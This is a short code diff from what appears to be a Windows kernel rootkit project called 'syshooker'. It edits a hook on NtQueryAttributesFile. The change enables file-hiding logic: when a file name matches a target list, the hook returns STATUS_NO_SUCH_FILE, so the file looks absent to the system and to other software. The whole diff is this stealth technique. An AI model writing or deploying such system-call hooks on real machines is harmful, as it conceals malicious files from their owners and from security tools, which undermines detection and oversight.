@@ -25,16 +25,19 @@ NTSTATUS DetourNtQueryAttributesFile(
 			memset(FileName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
 			memcpy(FileName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
 
-			kprintf("[+] syshooker: NtQueryAttributesFile: %ws\n", FileName);
+			// kprintf("[+] syshooker: NtQueryAttributesFile: %ws\n", FileName);
 
-			/*if (matchSyshookerNames(FileName, (Target)TARGET_FILE))
-			{
-				kprintf("[+] syshooker: Denying direct open access to file: %wZ.\n", ObjectAttributes->ObjectName);
+			// find the last L'\\' in the FileName to extract the file name itself from the full path
+			wchar_t* LastBackslash = wcsrchr(FileName, L'\\');
 
+			// if L'\\' was not found, pass the whole FileName to the matching function
+			// otherwise pass the remaining string AFTER the last backslash
+			// in other words - the extracted filename
+			if (matchSyshookerNames(LastBackslash == nullptr ? FileName : LastBackslash + 1, (Target)TARGET_FILE)) {
+				kprintf("[+] syshooker: NtQueryAttributesFile: hiding %ws\n", FileName);
 				ExFreePool(FileName);
-
 				return STATUS_NO_SUCH_FILE;
-			}*/
+			}
 
 			ExFreePool(FileName);
 		}
